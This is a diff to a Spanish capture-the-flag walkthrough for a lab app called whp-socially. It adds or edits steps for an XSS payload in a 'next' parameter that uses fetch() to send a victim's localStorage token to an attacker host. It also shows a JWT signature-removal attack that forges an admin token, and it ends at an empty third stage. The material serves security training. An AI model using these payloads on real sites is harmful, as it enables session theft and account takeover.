@@ -5,6 +5,8 @@
 <details>
 <summary>Mostrar</summary>
 
+En esta etapa, el objetivo es acceder a la aplicación con un usuario cualquiera.
+
 Para empezar, accedemos a http://whp-socially/ y nos encontramos con la siguiente pantalla:
 
 ![](img/MainPage.png)
@@ -86,7 +88,7 @@ Ahora, vamos a ver cuál es la dirección IP de nuestra máquina de atacante. Pa
 Con esta información, podemos crear un payload que utilice la función "fetch()" para enviar el token al servidor de atacante mediante una petición GET. El enlace quedaría de la siguiente manera:
 
 ```
-http://whp-socially/?next=j%09avascript:fetch(%27http://172.18.0.1/%27%2blocalStorage.getItem(%27token%27))
+http://whp-socially/?next=j%09avascript:fetch(%27http://<IP_ATACANTE>/%27%2blocalStorage.getItem(%27token%27))
 ```
 
 **Importante:** Hay que reemplazar \<IP_ATACANTE\> por la dirección IP de la máquina de atacante. Además, hay que codificar el carácter "+" en URL, para que no se interprete como un espacio en blanco.
@@ -108,7 +110,7 @@ Para solucionar esto, podemos ver si el resto de comillas están siendo escapada
 En este caso, los backticks no están siendo escapados. Por lo tanto, podemos utilizarlos para solucionar el problema. El enlace quedaría de la siguiente manera:
 
 ```
-http://whp-socially/?next=j%09avascript:fetch(`http://172.18.0.1/`%2blocalStorage.getItem(`token`))
+http://whp-socially/?next=j%09avascript:fetch(`http://<IP_ATACANTE>/`%2blocalStorage.getItem(`token`))
 ```
 
 Si probamos el enlace, vemos que la petición llega al servidor de atacante.
@@ -119,15 +121,15 @@ Nos llega el valor "null", esto se debe a que no estamos autenticados, pero esto
 
 ![](img/exploitServer.png)
 
-Pulsamos el botón "Deliver URL to victim" para enviar el enlace a la víctima. El servidor de explotación simula la navegación de la víctima y vemos que el token llega correctamente al servidor del atacante.
+Pulsamos el botón "Deliver URL to victim" para enviar el enlace a la víctima. El servidor de explotación simula la navegación de la víctima y vemos que un JSON Web Token (JWT) llega correctamente al servidor del atacante.
 
 ![](img/tokenReceived.png)
 
-Ahora, podemos utilizar el token para autenticarnos en la aplicación de http://whp-socially/. Abrimos la consola del navegador y ejecutamos el siguiente código JavaScript:
+Ahora, podemos utilizar el JWT para autenticarnos en la aplicación de http://whp-socially/. Abrimos la consola del navegador y ejecutamos el siguiente código JavaScript:
 
     localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6NX0.<FIRMA>')
 
-**Importante:** Para que la consola nos deje pegar el código anterior, hay que escribir "allow pasting" justo antes de ejecutar el código. Además, hay que reemplazar \<FIRMA\> por la firma del token que hemos obtenido.
+**Importante:** Para que la consola nos deje pegar el código anterior, hay que escribir "allow pasting" justo antes de ejecutar el código. Además, hay que reemplazar \<FIRMA\> por la firma del JWT que hemos obtenido.
 
 ![](img/localStoragesetItem.png)
 
@@ -141,5 +143,50 @@ Si recargamos la página, comprobamos que nos hemos autenticado correctamente co
 
 <details>
 <summary>Mostrar</summary>
+
+En esta etapa, vamos a ver cómo podemos acceder como administrador.
+
+Tras iniciar sesión, podemos ver que tenemos una funcionalidad para publicar posts, pero se encuentra deshabilitada. Por lo tanto, vamos a revisar el JWT en busca de vulnerabilidades.
+
+JWT se compone de tres partes: header, payload y firma. El header contiene información sobre el algoritmo de cifrado utilizado. El payload contiene la información que queremos guardar en el JWT. La firma se utiliza para verificar que el JWT no ha sido modificado, y se calcula mediante el header, el payload y una clave secreta.
+
+Gracias a la página [JWT.io](https://jwt.io/), podemos ver el contenido del JWT más fácilmente. Introducimos el JWT obtenido anteriormente y obtenemos la siguiente información:
+
+![](img/jwtdecoded.png)
+
+Tenemos un campo "id" con el valor "5", que seguramente corresponda al identificador del usuario. Para modificarlo, necesitamos conocer la clave secreta que se utiliza para firmar el JWT, a menos que podamos encontrar una vulnerabilidad.
+
+Si revisamos el HTTP History de Burp Suite al añadir un JWT en el Local Storage del navegador y refrescamos la página, se realiza una petición contra el endpoint "/session", que dado un JWT válido devuelve una cookie de sesión.
+
+![](img/jwtreturnssession.png)
+
+Vamos a probar a eliminar la firma del JWT y ver qué ocurre. Si se elimina la firma y la aplicación no la comprueba, el JWT se considera válido. Si esto ocurre, la aplicación debe devolver una cookie de sesión.
+
+![](img/signatureremoved.png)
+
+Esta vulnerabilidad permite manipular el payload del JWT, por lo que podemos modificar el valor de la clave "id" para que sea "1" y acceder como el primer usuario de la aplicación, que normalmente es el administrador.
+
+![](img/modifiedidjwt.png)
+
+Cerramos sesión y especificamos el JWT modificado desde la consola del navegador de la siguiente manera:
+
+    localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6MX0.')
+
+![](img/setadminjwt.png)
+
+Si recargamos la página, comprobamos que hemos accedido como administrador.
+
+![](img/loginasadmin.png)
+
+</details>
+
+## Etapa 3: Leer el archivo /flag
+
+<details>
+<summary>Mostrar</summary>
+
+En esta etapa, vamos a ver cómo podemos leer el archivo /flag.
+
+
 
 </details>
